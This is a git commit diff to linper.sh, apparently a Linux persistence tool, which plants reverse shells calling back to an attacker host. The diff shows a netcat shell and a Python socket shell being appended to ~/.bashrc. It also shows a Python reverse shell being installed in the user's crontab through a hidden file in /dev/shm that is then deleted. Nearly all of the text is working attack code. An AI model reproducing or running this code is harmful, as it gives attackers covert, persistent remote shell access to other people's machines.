f482ec475647bdea516359803a36aaba8832c762
montyonsecurity <jacobcainmontgomery@gmail.com>
2019-11-12 13:35:20 -0500

    fixed python logic oversight

--- linper.sh
+++ linper.sh
@@ -6,19 +6,11 @@ cron="* * * * *"
 
 if $(env | grep -qi HOME);
 then
-
 	touch ~/.bashrc
 	echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
 	if $(cat ~/.bashrc | grep $attackBox | grep -qi $attackPort);
 	then
-		echo "[+] Netcat reverse shell placed in $HOME/.bashrc"
-		echo "[+] Calls back to $attackBox:$attackPort"
-	fi
-
-	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
-	if $(cat ~/.bashrc | grep $attackBox | grep -qi "python");
-	then
-		echo "[+] Python reverse shell placed in $HOME/.bashrc"
+		echo "[+] Netcat reverse shell placed in $USER's bashrc"
 		echo "[+] Calls back to $attackBox:$attackPort"
 	fi
 fi
@@ -28,9 +20,15 @@ then
 	echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /dev/shm/.cron.sh
 	crontab /dev/shm/.cron.sh
 	rm /dev/shm/.cron.sh
-
 	if $(crontab -l | grep "python" | grep -qi $attackBox);
 	then
 		echo "[+] Python reverse shell written to $USER's crontab"
+		echo "[+] Calls back to $attackBox:$attackPort"
+	fi
+	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
+	if $(cat ~/.bashrc | grep $attackBox | grep -qi "python");
+	then
+		echo "[+] Python reverse shell placed in $USER's bashrc"
+		echo "[+] Calls back to $attackBox:$attackPort"
 	fi
 fi
